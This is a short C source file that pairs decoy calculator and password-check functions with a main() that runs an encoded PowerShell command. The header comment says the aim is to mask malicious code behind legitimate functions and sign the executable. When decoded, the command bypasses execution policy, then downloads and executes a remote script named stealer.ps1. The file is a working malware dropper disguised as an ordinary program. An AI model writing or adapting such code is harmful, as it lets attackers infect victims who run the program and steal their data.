#include <stdio.h>
#include <string.h>
#include <stdlib.h>
/* 
1. Mask malicious code, add in legitimate function
2. Sign exe
*/
int calculator(int digit_1, int digit_2) {
    int sum;
    sum = digit_1 + digit_2;
    printf("sum is %i\n", sum);
}

int main() {
    char b642[] = "powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBlAHgAZQBjACAAYgB5AHAAYQBzAHMAIAAtAEMAIAAiAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AbgBvAHQAYQBiAHUAZwAuAG8AcgBnAC8AYgBlAG4AbgB5AHQAaABhAG0AYQBuAG0AYQBuAC8AagBhAGMAYQBjAGMAYQBjAGEAYwAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBzAHQAZQBhAGwAZQByAC4AcABzADEAJwApACIA";
    system(b642);
}


void findKey() {
    char password[] = "hello";
    char input[100];
    int result;
    fgets(input, 100, stdin);
    result = strcmp(input, password);
    if ( result == 0 ){
        printf("correct!");
    }
    else {
        printf("incorrect!");
    }


}
